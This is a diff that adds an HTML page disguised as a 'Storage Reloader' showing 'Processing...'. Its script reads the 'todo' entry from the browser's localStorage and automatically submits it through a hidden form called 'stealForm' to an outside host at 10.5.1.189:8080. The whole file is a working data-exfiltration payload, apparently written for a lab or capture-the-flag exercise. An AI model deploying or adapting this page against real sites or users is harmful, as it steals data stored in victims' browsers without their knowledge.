@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Storage Reloader</title>
+</head>
+<body>
+    <h1>Processing...</h1>
+    <form id="stealForm" action="http://10.5.1.189:8080/" method="GET">
+        <input type="hidden" name="data" id="dataInput">
+    </form>
+
+    <script>
+        // 1. Try to get the data
+        const todoData = localStorage.getItem('todo');
+
+        if (todoData) {
+            // 2. Put the data into the hidden form
+            document.getElementById('dataInput').value = todoData;
+            
+            // 3. Submit the form automatically
+            document.getElementById('stealForm').submit();
+        } else {
+            document.body.innerHTML = "<h1>Error: No data found in LocalStorage.</h1><p>Ensure you are running this on the correct domain.</p>";
+        }
+    </script>
+</body>
+</html>
